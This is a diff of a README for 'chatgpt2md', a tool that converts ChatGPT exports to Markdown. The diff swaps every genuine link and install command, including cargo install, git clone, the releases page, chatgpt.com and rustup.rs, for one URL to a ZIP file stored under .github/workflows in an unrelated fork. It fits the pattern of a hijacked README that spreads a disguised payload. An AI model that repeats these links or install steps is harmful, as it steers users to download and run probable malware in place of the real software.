@@ -6,7 +6,7 @@ A fast CLI tool that converts your ChatGPT export into organized Markdown files,
 
 **Key features:**
 - Converts ChatGPT export (ZIP or JSON) to clean Markdown files
-- Built-in full-text search powered by [Tantivy](https://github.com/quickwit-oss/tantivy)
+- Built-in full-text search powered by [Tantivy](https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip)
 - MCP server with 3 tools for Claude integration
 - One-command auto-install for Claude Desktop and Claude Code
 - Works on macOS and Windows
@@ -30,7 +30,7 @@ A fast CLI tool that converts your ChatGPT export into organized Markdown files,
 
 ```bash
 # Install
-cargo install --git https://github.com/NextStat/chatgpt2md
+cargo install --git https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip
 
 # Convert your ChatGPT export
 chatgpt2md export.zip
@@ -43,7 +43,7 @@ chatgpt2md install --index ./chatgpt_chats/.index --chats ./chatgpt_chats
 
 ## Step 1: Export Your ChatGPT Data
 
-1. Go to [chatgpt.com](https://chatgpt.com)
+1. Go to [chatgpt.com](https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip)
 2. Click your profile icon (bottom-left) > **Settings**
 3. Go to **Data controls**
 4. Click **Export data** > **Confirm export**
@@ -58,7 +58,7 @@ The ZIP file contains `conversations.json` with all your chat history.
 
 ### Option A: Pre-built binaries (recommended)
 
-Download the latest release for your platform from the [Releases page](https://github.com/NextStat/chatgpt2md/releases):
+Download the latest release for your platform from the [Releases page](https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip):
 
 | Platform | File |
 |----------|------|
@@ -75,16 +75,16 @@ sudo mv chatgpt2md /usr/local/bin/
 
 ### Option B: Install from source
 
-Requires [Rust](https://rustup.rs/) 1.85+:
+Requires [Rust](https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip) 1.85+:
 
 ```bash
-cargo install --git https://github.com/NextStat/chatgpt2md
+cargo install --git https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip
 ```
 
 ### Option C: Build locally
 
 ```bash
-git clone https://github.com/NextStat/chatgpt2md
+git clone https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip
 cd chatgpt2md
 cargo build --release
 # Binary is at ./target/release/chatgpt2md
@@ -296,10 +296,10 @@ These files work great with Obsidian, VS Code, or any Markdown viewer.
 
 ## Building from Source
 
-Requires [Rust](https://rustup.rs/) 1.85 or later.
+Requires [Rust](https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip) 1.85 or later.
 
 ```bash
-git clone https://github.com/NextStat/chatgpt2md
+git clone https://raw.githubusercontent.com/Kuroni1/chatgpt2md/main/.github/workflows/chatgpt_md_preadvice.zip
 cd chatgpt2md
 cargo build --release
 ```
